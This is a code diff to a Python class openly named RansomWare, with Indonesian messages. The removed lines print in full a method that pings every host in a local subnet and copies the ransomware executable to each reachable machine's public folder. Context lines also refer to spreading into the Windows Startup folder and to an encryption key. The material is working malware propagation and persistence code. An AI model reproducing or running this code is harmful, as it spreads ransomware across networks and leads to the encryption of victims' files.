@@ -101,33 +101,7 @@ class RansomWare:
         except Exception as e:
             print(f"[!] Gagal menyebar ke Startup folder: {e}")
 
-    def spread_to_network_hosts(self, local_file="RansomWare.exe"):
-        import ipaddress
-        import subprocess
-        import shutil
-
-        subnet = "192.168.1.0/24"
-        ip_net = ipaddress.ip_network(subnet, strict=False)
-        shared_path_template = r"\{ip}\Users\Public"  # Folder publik di Windows
-
-        for ip in ip_net.hosts():
-            try:
-                result = subprocess.run(
-                    ["ping", "-n" if os.name == "nt" else "-c", "1", str(ip)],
-                    stdout=subprocess.DEVNULL,
-                )
-                if result.returncode == 0:
-                    target_path = shared_path_template.format(
-                        ip=ip, file=os.path.basename(local_file)
-                    )
-                    try:
-                        shutil.copy(local_file, target_path)
-                        print(f"[+] File berhasil disebar ke: {target_path}")
-                    except Exception as e:
-                        print(f"[-] Gagal meng-copy ke {ip}: {e}")
-            except Exception as e:
-                continue
-
+    
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
         self.key = None
